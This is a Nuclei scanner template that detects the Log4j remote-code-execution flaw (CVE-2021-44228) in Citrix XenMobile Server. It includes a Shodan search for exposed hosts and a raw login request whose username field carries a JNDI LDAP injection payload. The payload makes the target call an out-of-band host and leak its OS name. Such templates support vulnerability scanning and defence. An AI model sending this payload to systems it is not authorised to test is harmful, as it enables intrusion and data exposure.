id: xenmobile-server-log4j
info:
  name: Citrix XenMobile Server - Remote Code Execution (Apache Log4j)
  author: DhiyaneshDK
  severity: critical
  reference: https://support.citrix.com/article/CTX335705/citrix-security-advisory-for-cve202144228-cve202145046-cve202145105-and-cve202144832
  metadata:
    verified: true
    shodan-query: title:"XenMobile"
    impact: The impact of the Citrix XenMobile Server remote code execution vulnerability
      (exploited through the xenmobile-server-log4j) is the potential for unauthorized
      parties to execute code on affected systems and gain unrestricted access to
      critical data.
    recommendation: It is strongly recommended that users immediately update their
      Citrix XenMobile Server to address the Apache Log4j vulnerability and prevent
      remote code execution through the xenmobile-server-log4j.
  tags: cve,cve2021,rce,jndi,log4j,xenmobile,oast
  description: The Citrix XenMobile Server is vulnerable to remote code execution
    through the exploitation of a vulnerability in the Apache Log4j library.
requests:
- raw:
  - '@timeout: 20s

    POST /zdm/cxf/login HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json, text/javascript, */*; q=0.01

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    X-Requested-With: XMLHttpRequest

    Origin: {{BaseURL}}

    Referer: {{BaseURL}}/zdm/login_xdm_uc.jsp


    login=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}&password=admin

    '
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: regex
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+
  - type: word
    part: body
    words:
    - <h1>500 Server Internal Error
  extractors:
  - type: kval
    kval:
    - interactsh_ip
  - type: regex
    part: interactsh_request
    group: 1
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
